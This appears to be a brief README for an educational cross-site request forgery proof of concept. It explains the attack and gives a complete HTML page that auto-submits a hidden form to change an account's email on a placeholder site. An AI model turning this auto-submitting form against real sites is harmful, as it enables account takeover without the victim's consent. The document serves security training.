# CSRF-PoC-Script
A Simple, educational CSRF Proof of Concept demonstrating how cross-site request forgery attacks work. Intended for learning and security training only.


Overview

This PoC shows how a CSRF attack can trigger an action (such as changing an account email address) without the victim’s consent.
If the victim is logged in on the target site, their browser may automatically send cookies when this form is submitted.

PoC Example 
<!--<html>
  <body>
    <form method="POST" action="https://example.com/my-account/change-email">
      <input type="hidden" name="email" value="test@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>-->

